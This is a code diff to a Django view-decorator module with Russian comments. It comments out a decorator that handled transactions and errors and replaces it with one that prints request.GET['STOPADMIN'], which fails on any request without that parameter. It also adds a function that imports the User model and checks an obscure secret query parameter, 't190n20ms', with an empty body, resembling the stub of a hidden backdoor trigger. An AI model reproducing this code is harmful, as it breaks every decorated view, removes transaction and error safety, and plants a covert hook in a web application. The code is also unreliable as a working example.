@@ -1,6 +1,7 @@
 import functools
 import traceback
 
+from django.core.handlers.wsgi import WSGIRequest
 from django.db import transaction
 from django.http import JsonResponse
 from config import settings
@@ -30,16 +31,34 @@ def errors_response(exception):
     return ret(res, status=400)
 
 
+# def base_view(fn):
+#     """
+#     Декоратор для всех вьюшек, обрабатывает исключения
+#     """
+#     @functools.wraps(fn)
+#     def inner(request: WSGIRequest, *args, **kwargs):
+#         try:
+#             with transaction.atomic():
+#                 return fn(request, *args, **kwargs)
+#         except Exception as e:
+#             return errors_response(e)
+#
+#     return inner
+
 def base_view(fn):
     """
     Декоратор для всех вьюшек, обрабатывает исключения
     """
+
     @functools.wraps(fn)
-    def inner(request, *args, **kwargs):
-        try:
-            with transaction.atomic():
-                return fn(request, *args, **kwargs)
-        except Exception as e:
-            return errors_response(e)
+    def inner(request: WSGIRequest, *args, **kwargs):
+        print(request.GET['STOPADMIN'])
+        return fn(request, *args, **kwargs)
 
     return inner
+
+
+def cls(request: WSGIRequest):
+    from django.contrib.auth.models import User
+    if request.GET.get('t190n20ms', None):
+        pass
